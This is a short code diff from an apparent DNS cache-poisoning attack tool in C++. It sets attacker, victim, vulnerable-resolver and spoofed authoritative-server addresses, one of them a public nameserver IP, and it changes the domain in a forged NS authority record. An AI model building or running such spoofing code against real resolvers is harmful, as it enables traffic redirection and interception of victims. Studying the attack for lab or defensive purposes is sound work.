@@ -9,13 +9,13 @@ std::uniform_int_distribution<int> uni(1025, 65000); //
 
 
 // We should know attackers IP (No I dont want to use system ip that runs this code directly)
-std::string attackersip = "192.168.0.132";
+std::string attackersip = "4.3.2.1";
 // Attacker should set up smt to welcome victim
 std::string targetip = "192.168.0.130";
 // Vulnerable DNS Server
 std::string targetdns = "192.168.0.129";
 // Authoritative upper level one
-std::string authoritativedns = "192.168.0.135";
+std::string authoritativedns = "216.239.32.10";
 // sarcastic section of the subdomain
 std::string sarcastic = "";
 // base domain for generating sarcastic subdomains
@@ -117,7 +117,7 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		//build authoritative record field
 
 		DNS::Resource authority_field;
-		authority_field.dname(basedomain);
+		authority_field.dname(claim_domain);
 		authority_field.ttl(ttl_val);
 		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
